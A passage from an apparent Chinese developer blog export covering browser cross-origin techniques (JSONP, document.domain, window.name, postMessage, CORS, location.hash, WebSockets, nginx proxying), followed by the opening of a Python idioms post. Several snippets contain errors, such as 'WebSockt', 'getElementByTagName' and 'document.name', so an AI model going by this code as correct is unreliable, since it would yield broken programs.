<h2 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h2><h3 id="jsonp跨域"><a href="#jsonp跨域" class="headerlink" title="jsonp跨域"></a>jsonp跨域</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSONP（JSON with Padding）是数据格式JSON的一种“使用模式”，可以让网页从别的网域要数据。根据 XmlHttpRequest 对象受到同源策略的影响，而利用 &lt;script&gt;元素的这个开放策略，网页可以得到从其他来源动态产生的JSON数据，而这种使用模式就是所谓的 JSONP。用JSONP抓到的数据并不是JSON，而是任意的JavaScript，用 JavaScript解释器运行而不是用JSON解析器解析。所有，通过Chrome查看所有JSONP发送的Get请求都是js类型，而非XHR。</span><br><span class="line"> </span><br><span class="line">JSONP包含两部分：回调函数和数据。</span><br><span class="line">回调函数是当响应到来时要放在当前页面被调用的函数。</span><br><span class="line">数据就是传入回调函数中的json数据，也就是回调函数的参数了。</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleResponse</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'The responsed data is: '</span>+response.data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.src = <span class="string">'http://www.baidu.com/json/?callback=handleResponse'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.insertBefore(script, <span class="built_in">document</span>.body.firstChild);</span><br><span class="line"><span class="comment">/*handleResonse(&#123;"data": "zhe"&#125;)*/</span></span><br><span class="line"><span class="comment">//原理如下：</span></span><br><span class="line"><span class="comment">//当我们通过script标签请求时</span></span><br><span class="line"><span class="comment">//后台就会根据相应的参数(json,handleResponse)</span></span><br><span class="line"><span class="comment">//来生成相应的json数据(handleResponse(&#123;"data": "zhe"&#125;))</span></span><br><span class="line"><span class="comment">//最后这个返回的json数据(代码)就会被放在当前js文件中被执行</span></span><br><span class="line"><span class="comment">//至此跨域通信完成</span></span><br></pre></td></tr></table></figure>
<p><strong>缺点：</strong></p>
<ul>
<li>只能使用Get请求</li>
<li>不能注册success、error等事件监听函数，不能很容易的确定JSONP请求是否失败</li>
<li>JSONP是从其他域中加载代码执行，容易受到跨站请求伪造的攻击，其安全性无法确保</li>
</ul>
<h3 id="通过修改document-damain来进行跨域（主域相同）"><a href="#通过修改document-damain来进行跨域（主域相同）" class="headerlink" title="通过修改document.damain来进行跨域（主域相同）"></a>通过修改document.damain来进行跨域（主域相同）</h3><blockquote>
<p><strong>前提条件：这两个域名必须属于同一个基础域名!而且所用的协议，端口都要一致，否则无法利用<code>document.domain</code>进行跨域，所以只能跨子域</strong> 。 在<a href="https://developer.mozilla.org/en-US/docs/XPCOM_Interface_Reference/nsIEffectiveTLDService#getBaseDomain.28.29" target="_blank" rel="noopener">根域</a>范围内，允许把domain属性的值设置为它的上一级域。例如，在”aaa.xxx.com”域内，可以把domain设置为 “xxx.com” 但不能设置为 “xxx.org” 或者”com”</p>
</blockquote>
<p>比如：<a href="http://www.a.com/a.html和http://www.script.a.com/b.html" target="_blank" rel="noopener">http://www.a.com/a.html和http://www.script.a.com/b.html</a></p>
<p>1) 在<a href="http://www.a.com/a.html" target="_blank" rel="noopener">www.a.com/a.html</a>中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">'a.com'</span>;</span><br><span class="line"><span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">ifr.src = <span class="string">'http://www.script.a.com/b.html'</span>;</span><br><span class="line">ifr.display = none;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(ifr);</span><br><span class="line">ifr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> doc = ifr.contentDocument || ifr.contentWindow.document;</span><br><span class="line"> <span class="comment">//在这里操作doc，也就是b.html</span></span><br><span class="line"> ifr.onload = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<p>2) 在<a href="http://www.script.a.com/b.html" target="_blank" rel="noopener">www.script.a.com/b.html</a>中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain = <span class="string">'a.com'</span>;</span><br></pre></td></tr></table></figure>
<p>在两个html下通过js将<code>document.name = &#39;xxx.com&#39;;</code>设置一致，来达到互相访问的作用。</p>
<h3 id="使用window-name来进行跨域-gt"><a href="#使用window-name来进行跨域-gt" class="headerlink" title="使用window.name来进行跨域&gt;"></a>使用window.name来进行跨域&gt;</h3><blockquote>
<p><code>window.name</code>通过在iframe（一般动态创建i）中加载跨域HTML文件来起作用。然后，HTML文件将传递给请求者的字符串内容赋值给<code>window.name</code>。然后，请求者可以检索window.name值作为响应。</p>
</blockquote>
<ul>
<li>iframe标签的跨域能力；</li>
<li>window.name属性值在文档刷新后依旧存在的能力（且最大允许2M左右）</li>
</ul>
<p>比如：<a href="http://www.a.com/a.html和[http://www.b.com/b.html](http://www.script.a.com/b.html)" target="_blank" rel="noopener">http://www.a.com/a.html和[http://www.b.com/b.html](http://www.script.a.com/b.html)</a></p>
<p>1) a.html</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">  iframe.style.display = <span class="string">'none'</span>; <span class="comment">// 隐藏</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> state = <span class="number">0</span>; <span class="comment">// 防止页面无限刷新</span></span><br><span class="line">  iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(state === <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.parse(iframe.contentWindow.name));</span><br><span class="line">          <span class="comment">// 清除创建的iframe</span></span><br><span class="line">          iframe.contentWindow.document.write(<span class="string">''</span>);</span><br><span class="line">          iframe.contentWindow.close();</span><br><span class="line">          <span class="built_in">document</span>.body.removeChild(iframe);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state === <span class="number">0</span>) &#123;</span><br><span class="line">          state = <span class="number">1</span>;</span><br><span class="line">          <span class="comment">// 加载完成，指向当前域，防止错误(proxy.html为空白页面)</span></span><br><span class="line">          <span class="comment">// Blocked a frame with origin "http://www.a.com/a.html" from accessing a cross-origin frame.</span></span><br><span class="line">          iframe.contentWindow.location = <span class="string">'http://www.a.com/a.html'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  iframe.src = <span class="string">'http://www.b.com/b.html'</span>;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>2)在b.com/b.html中包含</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">     <span class="built_in">window</span>.name = <span class="string">'要传送的内容'</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="使用HTML5新引进的window-postMessage方法"><a href="#使用HTML5新引进的window-postMessage方法" class="headerlink" title="使用HTML5新引进的window.postMessage方法"></a>使用HTML5新引进的window.postMessage方法</h3><blockquote>
<p> HTML5新特性，可以用来向其他所有的 window 对象发送消息。需要注意的是我们必须要保证所有的脚本执行完才发送 MessageEvent，如果在函数执行的过程中调用了它，就会让后面的函数超时无法执行。</p>
</blockquote>
<p>1) a.com/index.html：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;iframe id=<span class="string">"ifr"</span> src=<span class="string">"b.com/index.html"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">var</span> ifr = <span class="built_in">document</span>.getElementById(<span class="string">'ifr'</span>);</span><br><span class="line">         <span class="keyword">var</span> targetOrigin = <span class="string">'http://b.com'</span>; <span class="comment">// 若写成'http://b.com/c/proxy.html'效果一样</span></span><br><span class="line">         <span class="comment">// 若写成'http://c.com'就不会执行postMessage了</span></span><br><span class="line">         ifr.contentWindow.postMessage(<span class="string">'I was there!'</span>, targetOrigin);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>2) b.com/index.html：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">     <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// 通过origin属性判断消息来源地址</span></span><br><span class="line">      <span class="keyword">if</span> (event.origin == <span class="string">'http://a.com'</span>) &#123;</span><br><span class="line">         alert(event.data); <span class="comment">// 弹出"I was there!"</span></span><br><span class="line">         alert(event.source); <span class="comment">// 对a.com、index.html中window对象的引用</span></span><br><span class="line">         <span class="comment">// 但由于同源策略，这里event.source不可以访问window对象</span></span><br><span class="line">      &#125;</span><br><span class="line">     &#125;, <span class="literal">false</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h3><blockquote>
<p>Cross-Origin Resource Sharing（CORS）跨域资源共享是一份浏览器技术的规范，提供了 Web 服务从不同域传来沙盒脚本的方法，以避开浏览器的同源策略，确保安全的跨域数据传输。现代浏览器使用CORS在API容器如XMLHttpRequest来减少HTTP请求的风险来源。与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求。服务器一般需要增加如下响应头的一种或几种.</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type</span><br><span class="line">Access-Control-Max-Age: <span class="number">86400</span></span><br></pre></td></tr></table></figure>
<p>跨域请求默认不会携带Cookie信息，如果需要携带，请配置下述参数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"Access-Control-Allow-Credentials"</span>: <span class="literal">true</span></span><br><span class="line"><span class="comment">// Ajax设置</span></span><br><span class="line"><span class="string">"withCredentials"</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>IE中对CORS的实现是xdr</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xdr = <span class="keyword">new</span> XDomainRequest();</span><br><span class="line">xdr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="built_in">console</span>.log(xdr.responseText);</span><br><span class="line">&#125;</span><br><span class="line">xdr.open(<span class="string">'get'</span>, <span class="string">'http://www.baidu.com'</span>);</span><br><span class="line">......</span><br><span class="line">xdr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>其它浏览器中的实现就在xhr中</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">304</span> || xhr.status == <span class="number">304</span>)&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'http://www.baidu.com'</span>);</span><br><span class="line">......</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>实现跨浏览器的CORS</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCORS</span>(<span class="params">method, url</span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"> <span class="keyword">if</span>(<span class="string">'withCredentials'</span> <span class="keyword">in</span> xhr)&#123;</span><br><span class="line">  xhr.open(method, url, <span class="literal">true</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> XDomainRequest != <span class="string">'undefined'</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XDomainRequest();</span><br><span class="line">  xhr.open(method, url);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  xhr = <span class="literal">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> xhr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> request = createCORS(<span class="string">'get'</span>, <span class="string">'http://www.baidu.com'</span>);</span><br><span class="line"><span class="keyword">if</span>(request)&#123;</span><br><span class="line"> request.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   ......</span><br><span class="line"> &#125;;</span><br><span class="line"> request.send();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="动态创建script"><a href="#动态创建script" class="headerlink" title="动态创建script"></a><strong>动态创建script</strong></h3><p>script标签不受同源策略的限制。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">url, func</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">var</span> head = <span class="built_in">document</span>.head || <span class="built_in">document</span>.getElementByTagName(<span class="string">'head'</span>)[<span class="number">0</span>]; </span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>); </span><br><span class="line">        script.src = url; </span><br><span class="line">        script.onload = script.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">this</span>.readyState || <span class="keyword">this</span>.readyState == <span class="string">'loaded'</span> || <span class="keyword">this</span>.readyState == <span class="string">'complete'</span>) &#123;  </span><br><span class="line">                func();  </span><br><span class="line">                script.onload = script.onreadystatechange = <span class="literal">null</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;; </span><br><span class="line">        head.insertBefore(script, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>.baidu = &#123; </span><br><span class="line">        sug: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123; </span><br><span class="line">            <span class="built_in">console</span>.log(data); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    loadScript(<span class="string">'http://suggestion.baidu.com/su?wd=w'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'loaded'</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//我们请求的内容在哪里？</span></span><br><span class="line">    <span class="comment">//我们可以在chorme调试面板的source中看到script引入的内容</span></span><br></pre></td></tr></table></figure>
<h3 id="利用location-hash-跨域"><a href="#利用location-hash-跨域" class="headerlink" title="利用location.hash 跨域"></a>利用<strong>location.hash 跨域</strong></h3><p>原理是利用location.hash来进行传值。</p>
<p>假设域名a.com下的文件cs1.html要和cnblogs.com域名下的cs2.html传递信息。</p>
<p>1) cs1.html首先创建自动创建一个隐藏的iframe，iframe的src指向cnblogs.com域名下的cs2.html页面</p>
<p>2) cs2.html响应请求后再将通过修改cs1.html的hash值来传递数据</p>
<p>3) 同时在cs1.html上加一个定时器，隔一段时间来判断location.hash的值有没有变化，一旦有变化则获取获取hash值</p>
<p> 代码如下：  先是a.com下的文件cs1.html文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startRequest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>); </span><br><span class="line">        ifr.style.display = <span class="string">'none'</span>; </span><br><span class="line">        ifr.src = <span class="string">'http://www.cnblogs.com/lab/cscript/cs2.html#paramdo'</span>;</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(ifr);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkHash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;           </span><br><span class="line">            <span class="keyword">var</span> data = location.hash ? location.hash.substring(<span class="number">1</span>) : <span class="string">''</span>;              </span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">console</span>.log) &#123;                   </span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'Now the data is '</span> + data);                  </span><br><span class="line">            &#125;             </span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">setInterval(checkHash, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
<p>cnblogs.com域名下的cs2.html:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//模拟一个简单的参数处理操作</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">switch</span>(location.hash) &#123;     </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'#paramdo'</span>:</span><br><span class="line">          callBack();          </span><br><span class="line">        <span class="keyword">break</span>;         </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'#paramset'</span>:</span><br><span class="line">           <span class="comment">//do something……</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callBack</span>(<span class="params"></span>) </span>&#123;     </span><br><span class="line">    <span class="keyword">try</span> &#123;          </span><br><span class="line">        parent.location.hash = <span class="string">'somedata'</span>;         </span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">           <span class="comment">// ie、chrome的安全机制无法修改parent.location.hash，</span></span><br><span class="line">           <span class="comment">// 所以要利用一个中间的cnblogs域下的代理iframe          </span></span><br><span class="line">        <span class="keyword">var</span> ifrproxy = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);          </span><br><span class="line">        ifrproxy.style.display = <span class="string">'none'</span>;          </span><br><span class="line">        ifrproxy.src = <span class="string">'http://a.com/test/cscript/cs3.html#somedata'</span>; <span class="comment">// 注意该文件在"a.com"域下          </span></span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(ifrproxy);         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>a.com下的域名cs3.html：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//因为parent.parent和自身属于同一个域，所以可以改变其location.hash的值</span></span><br><span class="line"> </span><br><span class="line">parent.parent.location.hash = self.location.hash.substring(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<h3 id="web-sockets"><a href="#web-sockets" class="headerlink" title="web sockets"></a><strong>web sockets</strong></h3><blockquote>
<p>web sockets是一种浏览器的API，它的目标是在一个单独的持久连接上提供全双工、双向通信。(同源策略对web sockets不适用)</p>
<p>web sockets原理：在JS创建了web socket之后，会有一个HTTP请求发送到浏览器以发起连接。取得服务器响应后，建立的连接会使用HTTP升级从HTTP协议交换为web sockt协议。</p>
<p>只有在支持web socket协议的服务器上才能正常工作。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = <span class="keyword">new</span> WebSockt(<span class="string">'ws://www.baidu.com'</span>);<span class="comment">//http-&gt;ws; https-&gt;wss</span></span><br><span class="line">socket.send(<span class="string">'hello WebSockt'</span>);</span><br><span class="line">socket.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> data = event.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="nginx反向代理"><a href="#nginx反向代理" class="headerlink" title="nginx反向代理"></a>nginx反向代理</h3><p>可以不用目标服务器配合，不过需要搭建一个中转nginx服务器，用于转发请求。需要在运维层面修改，且有可能请求的资源并不再我们控制范围内（第三方），所以该方式不能作为通用的解决方案。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/maggie_live/article/details/80005177" target="_blank" rel="noopener">https://blog.csdn.net/maggie_live/article/details/80005177</a></p>
<p><a href="https://blog.csdn.net/animatecat/article/details/82744098" target="_blank" rel="noopener">https://blog.csdn.net/animatecat/article/details/82744098</a></p>
]]></content>
      <categories>
        <category>web前端相关</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>同源策略</tag>
      </tags>
  </entry>
  <entry>
    <title>python编程小技巧</title>
    <url>/2018/10/07/python%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h2 id="python编程技巧总结："><a href="#python编程技巧总结：" class="headerlink" title="python编程技巧总结："></a>python编程技巧总结：</h2><blockquote>
<p>在python的编程中会使用各种各样的语法，通过一些小技巧可以优化python代码，学习总结如下。学习参考地址：<a href="https://github.com/JeffPaine/beautiful_idiomatic_python" target="_blank" rel="noopener">https://github.com/JeffPaine/beautiful_idiomatic_python</a></p>
</blockquote>
<h3 id="遍历一个序列"><a href="#遍历一个序列" class="headerlink" title="遍历一个序列"></a>遍历一个序列</h3><ol>
<li><p>python2:(xrange在遍历范围内创建一个迭代器，一次生成一个值，效率比range更高)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]:</span><br><span class="line">    <span class="keyword">print</span> i**<span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">print</span> i**<span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#better:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">print</span> i**<span class="number">2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>python:(xrange更名为range，进行了优化)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">color = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>,<span class="string">'yello'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(color)):</span><br><span class="line">    print(color[i])</span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"><span class="keyword">for</span> co <span class="keyword">in</span> color:</span><br><span class="line">    print(co)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="遍历倒序"><a href="#遍历倒序" class="headerlink" title="遍历倒序"></a>遍历倒序</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">color = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>,<span class="string">'yello'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(color)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    print(color[i])</span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"><span class="keyword">for</span> co <span class="keyword">in</span> reversed(color):</span><br><span class="line">    print(co)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="建立序列索引"><a href="#建立序列索引" class="headerlink" title="建立序列索引"></a>建立序列索引</h3><ul>
<li><p>python3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(colors)):</span><br><span class="line">    <span class="keyword">print</span> (i, <span class="string">'---&gt;'</span>, colors[i])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"><span class="keyword">for</span> i, color <span class="keyword">in</span> enumerate(colors):</span><br><span class="line">    <span class="keyword">print</span> (i, <span class="string">'---&gt;'</span>, color)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="遍历两个序列"><a href="#遍历两个序列" class="headerlink" title="遍历两个序列"></a>遍历两个序列</h3><ol>
<li><p>python2:(用izip返回迭代)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>]</span><br><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">n = min(len(names), len(colors))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    <span class="keyword">print</span> names[i], <span class="string">'---&gt;'</span>, colors[i]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> name, color <span class="keyword">in</span> zip(names, colors):</span><br><span class="line">    <span class="keyword">print</span> name, <span class="string">'---&gt;'</span>, color</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> name, color <span class="keyword">in</span> izip(names, colors):</span><br><span class="line">    <span class="keyword">print</span> name, <span class="string">'---&gt;'</span>, color</span><br></pre></td></tr></table></figure>
</li>
<li><p>python3:(用zip返回迭代)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>]</span><br><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">n = min(len(names),len(colors))</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> range(n):</span><br><span class="line">    print(names[i],<span class="string">'---&gt;'</span>,colors[i])</span><br><span class="line"><span class="comment">#batter</span></span><br><span class="line"><span class="keyword">for</span> name, color <span class="keyword">in</span> zip(names,colors):</span><br><span class="line">    print(name,<span class="string">'---&gt;'</span>,color)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="遍历排序的序列"><a href="#遍历排序的序列" class="headerlink" title="遍历排序的序列"></a>遍历排序的序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>,<span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Forward sorted order</span></span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> sorted(colors):</span><br><span class="line">    print(color)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Backwards sorted order</span></span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> sorted(colors,reverse=<span class="keyword">True</span>):</span><br><span class="line">    print(color)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="自定义遍历序列"><a href="#自定义遍历序列" class="headerlink" title="自定义遍历序列"></a>自定义遍历序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line">print(sorted(colors,key=len))</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="遍历文件遇到指定字符退出"><a href="#遍历文件遇到指定字符退出" class="headerlink" title="遍历文件遇到指定字符退出"></a>遍历文件遇到指定字符退出</h3><ul>
<li><p>python3:</p>
